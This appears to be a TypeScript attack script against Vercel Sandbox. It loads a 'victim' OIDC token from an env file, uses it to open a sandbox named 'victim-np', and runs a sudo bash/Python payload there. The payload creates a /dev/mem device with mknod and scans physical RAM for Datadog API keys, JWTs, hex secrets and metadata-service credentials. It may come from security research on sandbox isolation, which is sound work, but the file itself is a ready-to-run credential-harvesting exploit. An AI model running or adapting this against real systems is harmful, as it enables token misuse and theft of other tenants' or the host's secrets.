import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mknod /tmp/memdev c 1 1 2>/dev/null
echo "=== scanning guest physical RAM via /dev/mem for secrets ==="
python3 - <<'PYEOF'
import os, re, sys
fd = os.open("/tmp/memdev", os.O_RDONLY)
CHUNK = 8 * 1024 * 1024
total = 0
hits = []
buf_prev = b""
patterns = [
  (re.compile(rb"datadog", re.I), "datadog"),
  (re.compile(rb"api[-_]?key", re.I), "apikey"),
  (re.compile(rb"\.credentials\.datadog", re.I), "mmds-json"),
  (re.compile(rb"hive[-_]?id|cell[-_]?id", re.I), "hiveid"),
  (re.compile(rb"eyJ[a-zA-Z0-9_-]{10,}", re.I), "jwt"),
  (re.compile(rb"(?<![0-9a-f])[0-9a-f]{32}(?![0-9a-f])"), "hex32"),
  (re.compile(rb"dc_[0-9a-f]{30,}"), "dckey"),
]
max_offset = 0
off = 0
while True:
    try:
        data = os.pread(fd, CHUNK, off)
    except Exception as e:
        print("read err at", off, e)
        break
    if not data:
        break
    total += len(data)
    blob = buf_prev + data
    for pat, name in patterns:
        for m in pat.finditer(blob):
            s = max(0, m.start()-40)
            e = min(len(blob), m.end()+40)
            ctx = blob[s:e]
            # keep only printable-ish for the record; redact value
            ctxs = ctx.decode("latin1", "replace")
            # sanitize: replace hex32/dc_ value with REDACTED
            ctxs = re.sub(r"[0-9a-f]{32}", "[REDACTED_HEX32]", ctxs)
            ctxs = re.sub(r"dc_[0-9a-f]+", "[REDACTED_DCK]", ctxs)
            print(f"HIT[{name}] off~{off+s}: ...{ctxs}...", flush=True)
            hits.append((name, off+s))
            if len(hits) > 40:
                break
    if len(hits) > 40:
        break
    buf_prev = data[-256:]
    off += len(data) - 256
    if off > 2 * 1024 * 1024 * 1024:
        break
print("scanned bytes:", total, "hits:", len(hits))
PYEOF
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore26.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore26.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });